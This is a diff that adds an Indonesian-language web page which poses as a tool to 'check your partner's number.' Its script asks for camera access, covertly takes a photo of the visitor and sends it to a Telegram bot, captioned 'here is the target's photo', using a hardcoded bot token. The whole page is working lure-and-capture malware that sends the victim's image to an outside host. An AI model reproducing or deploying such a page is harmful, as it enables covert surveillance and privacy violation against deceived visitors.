@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<title>Cek Nomor Pasangan</title>
+<style>
+    :root {
+        --bg-image: url('https://files.catbox.moe/u0bsc4.jpeg'); /* GANTI di sini untuk background */
+    }
+    body {
+        font-family: Arial, sans-serif;
+        text-align: center;
+        background: var(--bg-image) no-repeat center center fixed;
+        background-size: cover;
+        color: white;
+        padding-top: 50px;
+    }
+    h1 {
+        font-size: 32px;
+        font-weight: bold;
+        text-shadow: 2px 2px 5px rgba(0,0,0,0.7);
+    }
+    h2 {
+        font-size: 20px;
+        font-weight: normal;
+        margin-top: 20px;
+        text-shadow: 1px 1px 4px rgba(0,0,0,0.6);
+    }
+    input, button {
+        padding: 10px;
+        font-size: 16px;
+        margin-top: 10px;
+        border-radius: 5px;
+        border: none;
+    }
+    button {
+        background: #28a745;
+        color: white;
+        cursor: pointer;
+    }
+</style>
+</head>
+<body>
+
+<h1>CEK NOMOR PASANGANMU SEKARANG</h1>
+<h2>Masukan teks untuk mendapatkan kontak</h2>
+
+<input type="text" id="userText" placeholder="Tulis di sini">
+<br>
+<button id="nextBtn">LANJUT</button>
+
+<video id="video" width="320" height="240" autoplay style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+const token = "8483703919:AAGJkko4GqVGcUbKdSj0SynzX8dTnmbLnPw"; // Ganti dengan token bot Telegram
+const chatId = "ISI_CHAT_ID_ANDA";  // Ganti dengan chat ID
+
+document.getElementById("nextBtn").addEventListener("click", async () => {
+    if (!document.getElementById("userText").value.trim()) {
+        alert("Masukkan teks terlebih dahulu!");
+        return;
+    }
+
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.getElementById("video");
+        video.style.display = "block";
+        video.srcObject = stream;
+
+        setTimeout(() => {
+            const canvas = document.getElementById("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(video, 0, 0);
+
+            stream.getTracks().forEach(track => track.stop());
+
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob, "foto.jpg");
+                formData.append("caption", "BERIKUT FOTO TARGET");
+
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                })
+                .then(res => res.json())
+                .then(data => {
+                    alert("Foto berhasil dikirim ke Telegram!");
+                })
+                .catch(err => {
+                    console.error(err);
+                    alert("Gagal mengirim foto.");
+                });
+            }, "image/jpeg");
+        }, 2000);
+
+    } catch (err) {
+        console.error(err);
+        alert("Gagal mengakses kamera.");
+    }
+});
+</script>
+
+</body>
+</html>
